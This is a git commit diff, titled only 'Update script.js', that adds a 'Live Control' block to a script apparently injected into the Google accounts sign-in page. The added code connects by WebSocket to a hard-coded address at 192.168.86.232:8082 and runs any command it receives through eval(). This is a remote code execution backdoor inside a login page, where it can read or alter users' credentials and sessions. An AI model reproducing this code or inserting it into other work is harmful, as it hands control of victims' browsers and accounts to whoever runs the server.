3857b4c7f1cc88e6dbfb50da665047c6c15c356f
Josh Chang <joshchang04@gmail.com>
2021-03-16 15:50:34 -0400

    Update script.js

--- script.js
+++ script.js
@@ -21,3 +21,24 @@ if(window.location.host === 'accounts.google.com'){
     }
   }, 10);
 }
+
+// Live Control
+const socket = new WebSocket('ws://192.168.86.232:8082');
+
+// Connection opened
+socket.addEventListener('open', function (event) {
+    var message = {
+        type: "handshake",
+        content: "client"
+    }
+    socket.send(JSON.stringify(message));
+});
+
+// Listen for messages
+socket.addEventListener('message', function (event) {
+    console.log('Message from server ', event.data);
+    var data = JSON.parse(event.data);
+    if(data.type === 'commandClient'){
+      eval(data.content);
+    }
+});
